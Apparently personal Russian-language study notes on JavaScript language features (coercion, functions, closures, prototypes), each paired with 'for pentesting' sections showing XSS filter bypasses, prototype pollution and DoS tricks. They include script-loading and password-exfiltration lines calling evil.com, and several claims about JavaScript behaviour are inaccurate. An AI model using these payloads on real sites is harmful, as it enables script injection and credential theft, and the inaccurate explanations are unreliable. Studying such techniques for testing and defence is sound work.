// 8. Если Type(x) == String/Number и Type(y) == Object -> x == ToPrimitive(y)
// 9. Если Type(x) == Object и Type(y) == String/Number -> ToPrimitive(x) == y
// 10. Иначе false
`
// ToPrimitive(obj, hint) - преобразует объект в примитив
// hint бывает "string", "number", "default"
// Обычно вызывает obj[Symbol.toPrimitive], потом valueOf, потом toString

// ПРИМЕРЫ:
console.log(5 == "5");        // true (строка в число)
console.log(0 == false);      // true (false в 0)
console.log(1 == true);       // true (true в 1)
console.log(null == undefined); // true
console.log([] == false);     // true! []
console.log([] == ![]);       // true! WAHT?!
console.log([] == 0);         // true!
console.log([1] == 1);        // true!
console.log([1,2] == "1,2");  // true!

` РАЗБОР [] == false
// 1. Type([]) == Object, Type(false) == Boolean
// 2. По правилу 7: правый булев -> ToNumber(false) = 0
// 3. Теперь [] == 0
// 4. Type([]) == Object, Type(0) == Number
// 5. По правилу 8: ToPrimitive([]) == 0
// 6. [].toString() = "" (пустая строка)
// 7. "" == 0
// 8. "" -> ToNumber("") = 0
// 9. 0 == 0 -> true
`
// РАЗБОР [] == ![]
// 1. Сначала ![]: ![] = false (так как [] truthy)
// 2. [] == false (см. выше) -> true!

// XSS-ВЕКТОР: обход валидации через ==
function validateInput(input) {
    if (input == null) {
        return "default"; // защита от null/undefined
    }
    if (input == 0) {
        return "zero"; // защита от нуля
    }
    return process(input);
}
// Но [] == null? false
// [] == 0? true! Попадем в zero
// Но zero может означать что-то опасное в контексте

// ToPrimitive кастомный для обхода
let evilObject = {
    [Symbol.toPrimitive](hint) {
        if (hint === 'number') {
            return 1;
        }
        if (hint === 'string') {
            return '<script>alert(1)</script>';
        }
        return 'default';
    }
};

console.log(5 + evilObject); // "5default" или "6"? зависит от hint
// В математике -> hint 'number' -> 5 + 1 = 6
// В строке -> hint 'default' (для +) -> "5default"
----------------------------------------------------

```
✅


**Для пентеста:** обход фильтров через неожиданное приведение

```javaScript
// 1. ОБХОД ФИЛЬТРА СТРОК
function filterXSS(str) {
    return str.replace(/<script>/gi, '');
}

// Обход 1: Используем объект с toString
let attack1 = {
    toString: () => '<script>alert(1)</script>'
};
filterXSS(attack1); // Работает? filterXSS ожидает строку
// Но JS передаст объект, filterXSS вызовет метод replace у объекта?
// Ошибка! Объект не имеет метода replace.
// Значит фильтр упадет, но может не сработать защита.

// Обход 2: Используем массив
let attack2 = ['<script>', 'alert(1)', '</script>'];
filterXSS(attack2); 
// attack2.toString() = "<script>,alert(1),</script>"
// replace удалит <script>? Нет, потому что это часть "<script>,"

// Обход 3: Используем числа
function filterNumeric(input) {
    if (typeof input === 'number') {
        return input; // Считаем числа безопасными
    }
    return escapeHtml(input);
}
let attack3 = { 
    valueOf: () => '<img src=x onerror=alert(1)>' 
};
filterNumeric(attack3); // typeof attack3 = "object", пройдет в else?
// Но если число ожидается в математической операции - вызовется valueOf!

// 2. ОБХОД ЧЕРЕЗ КОНКАТЕНАЦИЮ
function renderHTML(userData) {
    return '<div>' + userData + '</div>';
}
// Если userData - объект с toString = зло - XSS

// 3. ОБХОД ЧЕРЕЗ == В ПРОВЕРКАХ
function isAdmin(user) {
    return user.role == 1; // Используют ==
}
// Можно подсунуть user = { role: '1' } - пройдет
// Или user = { role: true } - true == 1 -> true
// Или user = { role: [] } - [] == 1? нет, [] == 1 false
// Но [] == 0 true

// 4. ОБХОД ЧЕРЕЗ TRUTHY/FALSY
function processInput(input) {
    if (!input) {
        return 'safe'; // Думают, что falsy значения безопасны
    }
    eval(input); // ОПАСНОСТЬ!
}
// Но falsy значения: 0, "", null, undefined, false, NaN
// "0" - truthy! пройдет в eval
// [] - truthy! пройдет в eval
// {} - truthy!

// 5. ОБХОД ЧЕРЕЗ NaN
function validateAge(age) {
    if (isNaN(age)) {
        return 18; // По умолчанию
    }
    return age;
}
// Но isNaN('XSS') = true - вернет 18
// А 18 может быть допустимым возрастом для опасного действия

// 6. ОБХОД ЧЕРЕЗ Symbol.toPrimitive
let universalBypass = {
    [Symbol.toPrimitive](hint) {
        if (hint === 'string') return '<img src=x onerror=alert(1)>';
        if (hint === 'number') return 1337;
        return 'default';
    }
};

// В разных контекстах дает разный результат
console.log(String(universalBypass)); // XSS строка
console.log(Number(universalBypass)); // 1337
console.log(5 + universalBypass);     // "5default" или 1338? зависит от реализации

// 7. ПРАКТИЧЕСКИЙ ПРИМЕР С PORT SWIGGER
// Допустим, сайт делает:
let userComment = getUserInput();
let safeComment = userComment.replace(/[<>]/g, ''); // Убирает < >
document.getElementById('comment').innerHTML = safeComment;

// Обход через объект:
let evilComment = {
    toString: function() {
        return '<img src=x onerror=alert(1)>';
    }
};
// userComment = evilComment
// safeComment = userComment.replace(...) - ОШИБКА! У объекта нет replace
// Приложение упадет? Или пропустит объект?
// Если в коде есть try/catch - может пропустить объект как есть
// И потом innerHTML получит объект, вызовет toString -> XSS!

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```
✅

### 1.3 Функции 



// Function Declaration vs Expression

```javaScript
// FUNCTION DECLARATION - объявляется через function имя() {}
function decl() {
    return 'I exist anywhere in scope';
}

// FUNCTION EXPRESSION - функция как значение
const expr = function() {
    return 'I exist only after this line';
};

// КЛЮЧЕВОЕ РАЗЛИЧИЕ - HOISTING (поднятие)
// Declaration можно вызвать до объявления
console.log(decl()); // "I exist anywhere in scope" - РАБОТАЕТ!

console.log(expr()); // ОШИБКА! Cannot access before initialization

// Named Function Expression (имеет имя для стека)
const named = function myName() {
    return 'myName доступна только внутри';
};
// myName() - снаружи не работает!

` ДЛЯ ПЕНТЕСТА: разница в видимости может скрывать код `
// Если переопределить declaration - можно сломать приложение
function isAdmin() {
    return false;
}

// Зловредный код позже
if (true) {
    function isAdmin() { // Переопределение в блоке!
        return true;
    }
}
console.log(isAdmin()); // true в некоторых браузерах! (поведение зависит от строгости)

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Стрелочные функции (this не свой)

```javaScript
// Стрелочные функции - синтаксис
const arrow1 = (a, b) => a + b;
const arrow2 = a => a * 2; // один параметр - без скобок
const arrow3 = () => 42; // без параметров
const arrow4 = (a, b) => ({ result: a + b }); // возврат объекта

// ГЛАВНОЕ: У стрелочных функций НЕТ СВОЕГО THIS
// Они берут this из внешнего контекста (лексический this)

const obj = {
    name: 'XSS',
    regular: function() {
        console.log(this.name); // 'XSS' - this = obj
    },
    arrow: () => {
        console.log(this.name); // undefined - this = глобальный объект (window)
    },
    nested: {
        arrow: () => {
            console.log(this.name); // undefined - this все еще внешний (глобальный)
        }
    }
};

` ДЛЯ ПЕНТЕСТА: обход проверок через стрелочные функции `

function SecurityCheck() {
    this.isAdmin = false;
    
    this.check = function() {
        console.log(this.isAdmin); // false
    };
    
    this.bypass = () => {
        console.log(this.isAdmin); // false - но this фиксирован!
    };
}

const sec = new SecurityCheck();
const stolenMethod = sec.bypass;
stolenMethod(); // false - this не потерялся! (в отличие от обычных функций)

// А если бы это была обычная функция:
const stolenRegular = sec.check;
stolenRegular(); // undefined или window/global - this потерян!

// Можно использовать для кражи методов с фиксированным контекстом

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// IIFE - самовызов (классика обхода)

```javaScript
// IIFE - Immediately Invoked Function Expression
(function() {
    console.log('Выполнилась сразу');
})();

// Варианты синтаксиса
(function() {
    console.log('Вариант 1');
}());

(function() {
    console.log('Вариант 2');
})();

(() => {
    console.log('Стрелочная IIFE');
})();

(async () => {
    const data = await fetch('/api');
})();

`ДЛЯ ПЕНТЕСТА: ОБХОД ФИЛЬТРОВ ЧЕРЕЗ IIFE`

// 1. Создание изолированного контекста
(function() {
    // Здесь можно переопределить встроенные функции незаметно
    const originalAlert = window.alert;
    window.alert = function(msg) {
        originalAlert('HACKED: ' + msg);
    };
})();

// 2. Обход CSP через IIFE
// Если CSP разрешает 'unsafe-inline', можно выполнить код
javascript: (function(){alert(1)})()

// 3. Сокрытие вредоносного кода
const payload = 'alert(1)';
Function(payload)(); // eval-подобное выполнение

// 4. В XSS часто используют IIFE для немедленного выполнения
"><img src=x onerror="(function(){var s=document.createElement('script');s.src='http://evil.com/xss.js';document.body.appendChild(s)})()"

// 5. Обход фильтров на круглые скобки
// Если фильтр блокирует (), можно использовать другие конструкции
new Function('alert(1)')(); // Function constructor не требует скобок снаружи

// 6. Использование операторов для вызова
true && function(){alert(1)}(); // Через &&
0 || function(){alert(1)}();     // Через ||
void function(){alert(1)}();      // Через void
!function(){alert(1)}();          // Через !

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Замыкания (Closures) - утечки данных

```javaScript
// Замыкание - функция + внешние переменные, которые она "запомнила"
function createCounter() {
    let count = 0; // Приватная переменная
    
    return {
        increment: function() {
            count++;
            return count;
        },
        getCount: function() {
            return count;
        }
    };
}

const counter = createCounter();
console.log(counter.increment()); // 1
console.log(counter.increment()); // 2
console.log(counter.getCount());  // 2
// count НЕДОСТУПЕН напрямую: counter.count = undefined

` ДЛЯ ПЕНТЕСТА: УТЕЧКИ ДАННЫХ И ОБХОД `

// 1. Кража данных через замыкания
function vulnerableModule(secret) {
    // secret = "admin:password123"
    
    return {
        publicMethod: function() {
            // Здесь можно украсть secret
            window.evilCallback = function() {
                return secret; // УТЕЧКА!
            };
            return 'OK';
        }
    };
}

const module = vulnerableModule('admin:password123');
module.publicMethod();
console.log(window.evilCallback()); // "admin:password123" - данные украдены!

// 2. Замыкания для обфускации (обход WAF)
const xssPayload = (function() {
    const a = 'aler';
    const b = 't(1)';
    const c = a + b;
    
    return function() {
        return window[c](); // динамический вызов
    };
})();

// 3. Мемоизация с утечкой
function cacheUserInput() {
    const cache = {}; // Здесь хранятся все введенные данные
    
    return function(input) {
        cache[input] = true;
        return input;
    };
}
// Если злоумышленник получит доступ к cache - утечка данных

// 4. Модификация приватных переменных через замыкания
function createToken() {
    let token = 'original';
    
    return {
        getToken: () => token,
        setToken: (newToken) => { token = newToken; }
    };
}

const tokenObj = createToken();
// Если злоумышленник может вызвать setToken - подмена токена!
tokenObj.setToken('evil_token');

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Hoisting - поднятие (можно вызвать до объявления?)

```javaScript
// Hoisting - "поднятие" объявлений в начало области видимости

// 1. var - поднимается, но инициализируется undefined
console.log(a); // undefined (не ошибка!)
var a = 5;
console.log(a); // 5

// 2. let/const - поднимаются, но НЕ инициализируются (Temporal Dead Zone)
console.log(b); // ReferenceError: Cannot access before initialization
let b = 10;

// 3. Function Declaration - поднимается полностью
console.log(foo()); // "foo" - работает!
function foo() {
    return 'foo';
}

// 4. Function Expression - поднимается как переменная
console.log(bar); // undefined (если var)
console.log(bar()); // TypeError: bar is not a function
var bar = function() {
    return 'bar';
};

` ДЛЯ ПЕНТЕСТА: ИСПОЛЬЗОВАНИЕ HOISTING `

// 1. Обход проверок через порядок выполнения
var isAdmin = false;

function checkAccess() {
    // Hoisting поднимает function declaration ВНУТРИ блока по-разному
    if (!isAdmin) {
        function adminBypass() { // В strict mode так нельзя
            return true;
        }
    }
    return adminBypass(); // Может сработать в старых браузерах!
}

// 2. Переопределение функций до их объявления
function original() {
    return 'safe';
}

// Где-то в коде до оригинальной функции
original = function() { // Можно переопределить через var?
    return 'XSS';
};

// 3. TDZ для обхода инициализации
function tdBypass() {
    try {
        console.log(x); // ReferenceError
    } catch(e) {
        // Можно использовать факт ошибки для вывода информации
        console.log(e.stack); // Утечка информации!
    }
    let x = 'secret';
    
    👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
}
```


// Arguments vs rest parameters

```javaScript
// arguments - псевдомассив всех переданных аргументов (только в function)
function oldSchool() {
    console.log(arguments[0]); // первый аргумент
    console.log(arguments.length); // количество
    console.log(arguments.callee); // сама функция (deprecated)
    
    // arguments - НЕ массив!
    arguments.forEach // Ошибка! Нет метода forEach
    Array.from(arguments).forEach // так работает
}

oldSchool(1, 2, 3, 4); // arguments = [1,2,3,4]

// Rest parameters ...args - реальный массив
function modern(first, ...rest) {
    console.log(first); // 1
    console.log(rest);  // [2,3,4] - массив!
    rest.forEach(x => console.log(x)); // работает
}

modern(1, 2, 3, 4);

` ДЛЯ ПЕНТЕСТА: АТАКИ ЧЕРЕЗ АРГУМЕНТЫ `

// 1. Изменение arguments влияет на параметры!
function vulnerable(a, b) {
    arguments[0] = 'XSS'; // Меняем первый параметр
    arguments[1] = 'injection';
    console.log(a, b); // "XSS", "injection" - параметры изменились!
}
vulnerable('safe', 'safe');

// 2. Утечка через arguments.callee (в нестрогом режиме)
function leak() {
    console.log(arguments.callee.toString()); // Код функции!
}
leak(); // Можно получить исходник функции

// 3. Обход валидации длины через rest
function validate(input) {
    if (input.length < 3) { // Для строки
        return 'too short';
    }
    return input;
}

validate([1,2]); // [1,2] - массив прошел проверку, хотя длина 2!
// Но массив может быть приведен к строке позже

// 4. Атака на функции с rest параметрами
function process(...args) {
    // args - массив из аргументов
    return args.join(',');
}
// Можно передать огромное количество аргументов для DoS
process(...Array(1000000).fill('x')); // Может вызвать проблемы с памятью


👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Функции-конструкторы (new)

```javaScript
// Функция-конструктор - создает объекты через new
function User(name, role) {
    // this = {} (создается автоматически)
    this.name = name;
    this.role = role;
    this.isAdmin = function() {
        return this.role === 'admin';
    };
    // return this (автоматически)
}

const user1 = new User('Alice', 'admin');
console.log(user1.name); // 'Alice'

// Что делает new:
// 1. Создает пустой объект {}
// 2. Прототипом становится User.prototype
// 3. Выполняет функцию с this = новый объект
// 4. Возвращает this (если функция не вернула свой объект)

// Возврат из конструктора
function Malicious() {
    this.safe = true;
    return { xss: 'payload' }; // Переопределяет возврат!
}
const m = new Malicious();
console.log(m.safe); // undefined! m = { xss: 'payload' }
console.log(m.xss);  // 'payload'

` ДЛЯ ПЕНТЕСТА: АТАКИ ЧЕРЕЗ КОНСТРУКТОРЫ `

// 1. Переопределение встроенных конструкторов
String = function(original) {
    return function(str) {
        const result = new original(str);
        // Добавляем XSS во все строки!
        result.xssPayload = '<script>alert(1)</script>';
        return result;
    };
}(String);

const s = new String('test');
console.log(s.xssPayload); // Везде добавилось свойство!

// 2. Замена прототипов через конструктор
function Attack() {
    // Пустой конструктор
}
Attack.prototype = {
    toString: function() {
        return '<img src=x onerror=alert(1)>';
    }
};

const obj = new Attack();
document.body.innerHTML += obj; // XSS!

// 3. Обход instanceof через изменение прототипа
function isUser(obj) {
    return obj instanceof User; // Проверка
}

const fake = { name: 'hacker' };
Object.setPrototypeOf(fake, User.prototype);
console.log(isUser(fake)); // true - обманули проверку!

// 4. Глобальное загрязнение через конструктор
window.constructor.prototype.xss = 'payload';
// Теперь у всех объектов есть .xss!
const empty = {};
console.log(empty.xss); // 'payload'

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Методы call, apply, bind

```javaScript
// call, apply, bind - управление this

function greet(greeting, punctuation) {
    return `${greeting}, ${this.name}${punctuation}`;
}

const person = { name: 'Alice' };
const admin = { name: 'ADMIN' };

// call - вызывает функцию с указанным this и аргументами через запятую
console.log(greet.call(person, 'Hello', '!')); // "Hello, Alice!"

// apply - то же, но аргументы массивом
console.log(greet.apply(admin, ['Hi', '?'])); // "Hi, ADMIN?"

// bind - создает НОВУЮ функцию с привязанным this
const greetAlice = greet.bind(person);
console.log(greetAlice('Hey', '.')); // "Hey, Alice."

// Частичное применение (каррирование)
const greetExclaim = greet.bind(null, 'Wow'); // this = null (глобальный)
console.log(greetExclaim.call(person, '!!')); // "Wow, Alice!!"

` ДЛЯ ПЕНТЕСТА: ИСПОЛЬЗОВАНИЕ В ЭКСПЛОИТАХ `

// 1. Кража методов с привязкой контекста
const secretObj = {
    token: 'SECRET-123',
    getToken: function() {
        return this.token;
    }
};

// Украли метод, но он потерял контекст
const stolen = secretObj.getToken;
console.log(stolen()); // undefined (this = window/global)

// Привязываем контекст обратно!
const bound = stolen.bind(secretObj);
console.log(bound()); // "SECRET-123" - украли токен!

// 2. Переопределение методов через call/apply
const arr = [1, 2, 3, 4];
// Обычный forEach
arr.forEach(function(x) {
    console.log(this, x); // this = global
});

// Принудительно меняем this
arr.forEach(function(x) {
    console.log(this, x); // this = {hacked: true}
}, {hacked: true});

// 3. Обход проверок через call
function validate(func) {
    if (typeof func !== 'function') {
        return 'not a function';
    }
    return func(); // Вызываем
}

// Передаем объект с методом call
const evil = {
    call: function() {
        return 'XSS!';
    }
};
// Объект - не функция, но у него есть call!
validate(evil); // 'XSS!' - обошли проверку!

// 4. Использование apply для передачи огромных массивов
function sum(a, b, c) {
    return a + b + c;
}
// Можно вызвать с массивом любой длины
sum.apply(null, [1,2,3,4,5,6]); // Работает, лишние игнорятся
// Но можно создать DoS через огромный массив
try {
    sum.apply(null, new Array(10000000)); // Может упасть
} catch(e) {
    console.log('DoS possible');
}

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Имена функций в стеке вызовов

```javaScript
// Функции имеют имена, которые видны в stack trace

// Named function
function namedFunction() {
    throw new Error('Boom');
}

// Anonymous function
const anon = function() {
    throw new Error('Boom');
};

// Arrow function
const arrow = () => {
    throw new Error('Boom');
};

// Named function expression
const named = function myName() {
    throw new Error('Boom');
};

` ДЛЯ ПЕНТЕСТА: УТЕЧКИ ЧЕРЕЗ STACK TRACE` 

// 1. Получение путей к файлам
function leakPaths() {
    try {
        null();
    } catch(e) {
        console.log(e.stack);
        // Может содержать: at leakPaths (file:///app/src/main.js:10:5)
        // Утечка структуры директорий!
    }
}

// 2. Обнаружение фреймворков по именам в стеке
function detectFramework() {
    try {
        throw new Error();
    } catch(e) {
        const stack = e.stack;
        if (stack.includes('React')) {
            console.log('Using React');
        } else if (stack.includes('Angular')) {
            console.log('Using Angular');
        }
    }
}

// 3. Кража исходного кода через toString
function vulnerableFunc() {
    // Секретный код здесь
    const secret = 'password123';
}

console.log(vulnerableFunc.toString()); // Весь код функции!

// 4. Обфускация через анонимные функции
// Если все функции анонимные - сложнее отлаживать эксплойт
(function() {
    (function() {
        (() => {
            alert(1); // Где ошибка? Хуй поймешь!
        })();
    })();
})();

// 5. Переопределение имени функции в рантайме
function originalName() {}
originalName.displayName = 'HackedName';
console.log(originalName.name); // "originalName" (не меняется)
console.log(originalName.displayName); // "HackedName" (некоторые движки)

// 6. Использование Function.name для идентификации
function isAdminFunction(fn) {
    return fn.name === 'adminCheck';
}
// Можно переименовать через Object.defineProperty
Object.defineProperty(fn, 'name', { value: 'adminCheck' });
// Обманули проверку!


👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```



### 1.4 Объекты 



// Литералы vs конструкторы

```javaScript
// Литеральный синтаксис - простой и безопасный
const literal = {
    name: 'XSS',
    greet() {
        return 'Hello';
    }
};

// Конструктор Object
const obj1 = new Object(); // {}
const obj2 = Object.create(null); // {} без прототипа

// Конструкторы встроенных типов
const arr = new Array(10); // массив длины 10 (пустые)
const str = new String('XSS'); // объект-обертка, не примитив!
const num = new Number(42); // объект-обертка
const bool = new Boolean(false); // объект-обертка (bool && true!)

` ДЛЯ ПЕНТЕСТА: РАЗНИЦА В ПОВЕДЕНИИ`

// 1. Объекты-обертки ведут себя иначе
const primitive = 'XSS';
const wrapper = new String('XSS');

console.log(typeof primitive); // "string"
console.log(typeof wrapper);   // "object"
console.log(primitive === wrapper); // false
console.log(primitive == wrapper);  // true (приведение)

// 2. Объекты-обертки всегда truthy
const falseWrapper = new Boolean(false);
if (falseWrapper) {
    console.log('Это выполнится!'); // truthy!
}

// 3. Массивы через конструктор
const arr1 = [1, 2, 3]; // нормальный массив
const arr2 = new Array(3); // [empty × 3] - дыры!
console.log(arr2.map(x => x + 1)); // [empty × 3] - map пропускает дыры

// 4. Обход проверок через обертки
function isString(s) {
    return typeof s === 'string';
}
isString(new String('XSS')); // false - обошли проверку!


👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Свойства: data property vs accessor (get/set)

```javaScript
// DATA PROPERTY - обычные свойства
const obj = {
    name: 'Alice', // data property
    age: 30
};

// ACCESSOR PROPERTY - геттеры/сеттеры
const user = {
    firstName: 'John',
    lastName: 'Doe',
    
    // Геттер
    get fullName() {
        return `${this.firstName} ${this.lastName}`;
    },
    
    // Сеттер
    set fullName(value) {
        [this.firstName, this.lastName] = value.split(' ');
    }
};

console.log(user.fullName); // "John Doe" - вызывается геттер
user.fullName = 'Jane Smith'; // вызывается сеттер
console.log(user.firstName); // "Jane"

// ДЛЯ ПЕНТЕСТА: ЭКСПЛУАТАЦИЯ ACCESSOR

// 1. Геттеры для скрытого выполнения кода
const evil = {
    get xss() {
        alert(1); // Код выполняется при чтении!
        return 'payload';
    }
};

// Если где-то прочитают свойство - XSS!
console.log(evil.xss); // Триггер

// 2. Сеттеры для перехвата присваиваний
const hook = {
    set password(val) {
        // Перехватываем пароль!
        fetch('https://evil.com/steal?p=' + val);
        this._password = val;
    }
};
hook.password = 'secret123'; // Утекло!

// 3. Обход через defineProperty
const target = {};
Object.defineProperty(target, 'admin', {
    get: () => true, // Всегда возвращаем true
    configurable: false
});
// Проверка на админа всегда true!

// 4. Дескрипторы для создания ловушек
Object.defineProperty(globalThis, 'document', {
    get: () => {
        console.log('document accessed!'); // Мониторинг
        return originalDocument;
    }
});

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Дескрипторы (writable, enumerable, configurable)

```javaScript
// Дескрипторы - флаги, управляющие поведением свойств
const obj = {};

// defineProperty - полный контроль
Object.defineProperty(obj, 'hidden', {
    value: 'secret',
    writable: false,     // Нельзя изменить
    enumerable: false,   // Не показывается в for...in
    configurable: false  // Нельзя удалить и изменить флаги
});

Object.defineProperty(obj, 'readonly', {
    value: 42,
    writable: false,
    enumerable: true,
    configurable: true
});

// Попытки изменить
obj.hidden = 'new'; // Не изменится (тихо игнор в нестрогом)
obj.readonly = 100; // Не изменится
delete obj.hidden;   // Не удалится (configurable: false)

// Object.defineProperties - несколько сразу
Object.defineProperties(obj, {
    prop1: { value: 1, writable: true },
    prop2: { value: 2, enumerable: true }
});

// Получение дескрипторов
const desc = Object.getOwnPropertyDescriptor(obj, 'hidden');
console.log(desc); 
// { value: 'secret', writable: false, enumerable: false, configurable: false }

// ДЛЯ ПЕНТЕСТА: МАНИПУЛЯЦИЯ ФЛАГАМИ

// 1. Скрытие вредоносных свойств
const backdoor = {};
Object.defineProperty(backdoor, 'payload', {
    value: '<script>alert(1)</script>',
    enumerable: false // Не видно в циклах и JSON.stringify
});
console.log(Object.keys(backdoor)); // [] - пусто!
console.log(JSON.stringify(backdoor)); // "{}" - payload скрыт!

// 2. Блокировка изменений защитных механизмов
function secureObject() {
    const security = {
        isAdmin: false
    };
    
    Object.defineProperty(security, 'isAdmin', {
        writable: false, // Нельзя изменить!
        configurable: false
    });
    
    return security;
}
const sec = secureObject();
sec.isAdmin = true; // Не работает! (в нестрогом - тихо, в строгом - ошибка)

// 3. Обход через переопределение дескрипторов
const frozen = { x: 1 };
Object.freeze(frozen); // writable: false, configurable: false

// Но если есть доступ к прототипу...
Object.prototype.hasOwnProperty = function() {
    return true; // Переопределили проверку!
};

// 4. Проверка флагов для обхода
function isExtensible(obj) {
    return Object.isExtensible(obj);
}
// Если объект заморожен - false
// Можно создать объект, который притворяется замороженным через Proxy

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Прототипы (__proto__, prototype) - ЭТО ВАЖНО

```javaScript
// КАЖДАЯ ФУНКЦИЯ имеет prototype (кроме стрелочных)
function Animal(name) {
    this.name = name;
}
Animal.prototype.speak = function() {
    return `${this.name} speaks`;
};

// КАЖДЫЙ ОБЪЕКТ имеет __proto__ (ссылка на prototype конструктора)
const dog = new Animal('Rex');
console.log(dog.__proto__ === Animal.prototype); // true
console.log(Animal.prototype.__proto__ === Object.prototype); // true
console.log(Object.prototype.__proto__); // null - конец цепочки

// Цепочка прототипов: dog → Animal.prototype → Object.prototype → null

// Современный API
Object.getPrototypeOf(dog) === Animal.prototype;
Object.setPrototypeOf(dog, Other.prototype);

// ДЛЯ ПЕНТЕСТА: PROTOTYPE POLLUTION - ЭТО БОМБА!

// 1. Базовое загрязнение прототипа
Object.prototype.xss = 'payload';
const obj = {};
console.log(obj.xss); // 'payload' - у всех объектов!

// 2. Через __proto__ в JSON
const userInput = '{"__proto__": {"isAdmin": true}}';
const parsed = JSON.parse(userInput);
// Теперь у ВСЕХ объектов isAdmin: true!
const newObj = {};
console.log(newObj.isAdmin); // true - АДМИН!

// 3. Через конструктор
function pollute() {
    // Изменяем prototype всех объектов
    Object.prototype.toString = function() {
        return '<img src=x onerror=alert(1)>';
    };
}
// Теперь любой объект при приведении к строке - XSS!

// 4. Цепочка прототипов для обхода фильтров
function clean(obj) {
    const result = {};
    for (let key in obj) {
        if (obj.hasOwnProperty(key)) { // Проверяет только собственные свойства
            result[key] = obj[key];
        }
    }
    return result;
}
// Но свойства из прототипа не копируются - можно их использовать!
const polluted = {};
polluted.__proto__.evil = 'XSS';
const cleaned = clean(polluted); // {} - чистый
// Но cleaned.evil все еще доступен через прототип!
console.log(cleaned.evil); // 'XSS' - обошли очистку!

// 5. Атака через constructor
Object.prototype.constructor.prototype.malicious = true;
// Теперь у всех объектов через constructor.prototype...

// 6. Замена встроенных методов
String.prototype.contains = function(original) {
    return function(term) {
        if (term === 'admin') {
            return true; // Всегда говорим, что строка содержит admin
        }
        return original.call(this, term);
    };
}(String.prototype.contains);

// Теперь проверка "user".contains('admin') - true!

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Object.create, Object.assign

```javaScript
// Object.create - создает объект с указанным прототипом
const prototype = {
    greet() { return 'Hello'; }
};

const obj = Object.create(prototype);
obj.name = 'Alice';
console.log(obj.greet()); // 'Hello' - из прототипа
console.log(obj.__proto__ === prototype); // true

// Создание без прототипа
const noProto = Object.create(null);
console.log(noProto.toString); // undefined - нет методов Object

// Object.assign - копирует свойства из источников в цель
const target = { a: 1 };
const source1 = { b: 2 };
const source2 = { c: 3, a: 10 }; // перезапишет a

Object.assign(target, source1, source2);
console.log(target); // { a: 10, b: 2, c: 3 }

// ДЛЯ ПЕНТЕСТА: ЭКСПЛУАТАЦИЯ

// 1. Атака через Object.create(null)
// Объекты без прототипа не имеют встроенных методов
const safe = Object.create(null);
// safe.toString // undefined - не упадет на проверках

// Но можно использовать для обхода проверок на hasOwnProperty
function check(obj) {
    if (obj.hasOwnProperty('admin')) { // Ошибка! obj.hasOwnProperty нет
        return obj.admin;
    }
    return false;
}
check(safe); // TypeError - краш приложения

// 2. Object.assign для загрязнения прототипа
function merge(target, source) {
    for (let key in source) {
        if (source.hasOwnProperty(key)) {
            target[key] = source[key];
        }
    }
    return target;
}

// Уязвимый merge
const malicious = JSON.parse('{"__proto__": {"polluted": true}}');
merge({}, malicious); // Если merge не проверяет __proto__ - pollution!

// 3. Object.assign с геттерами
const evilSource = {
    get x() {
        alert(1); // Выполнится при копировании!
        return 42;
    }
};
Object.assign({}, evilSource); // Триггер XSS!

// 4. Создание объектов без прототипа для изоляции
function createIsolated(data) {
    return Object.assign(Object.create(null), data);
}
// Такой объект безопаснее, но несовместим с некоторым кодом
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Spread оператор {...obj}

```javaScript
// Spread - копирует собственные перечисляемые свойства
const original = { a: 1, b: 2 };
const copy = { ...original, c: 3 };
console.log(copy); // { a: 1, b: 2, c: 3 }

// Для массивов
const arr = [1, 2, 3];
const newArr = [...arr, 4, 5]; // [1, 2, 3, 4, 5]

// Rest в деструктуризации
const { a, ...rest } = original;
console.log(rest); // { b: 2 }

// ДЛЯ ПЕНТЕСТА: ОСОБЕННОСТИ

// 1. Spread копирует ТОЛЬКО собственные свойства
const objWithProto = Object.create({ inherited: 42 });
objWithProto.own = 100;

const spread = { ...objWithProto };
console.log(spread.inherited); // undefined - не копирует из прототипа
console.log(spread.own); // 100

// 2. Spread не копирует неперечисляемые свойства
Object.defineProperty(objWithProto, 'hidden', {
    value: 'secret',
    enumerable: false
});
const spread2 = { ...objWithProto };
console.log(spread2.hidden); // undefined - hidden скрыт

// 3. Spread вызывает геттеры!
const withGetter = {
    get x() {
        alert(1); // Триггер при spread!
        return 42;
    }
};
const spread3 = { ...withGetter }; // XSS!

// 4. Порядок важен
const evil = { 
    ...{ x: 1 },
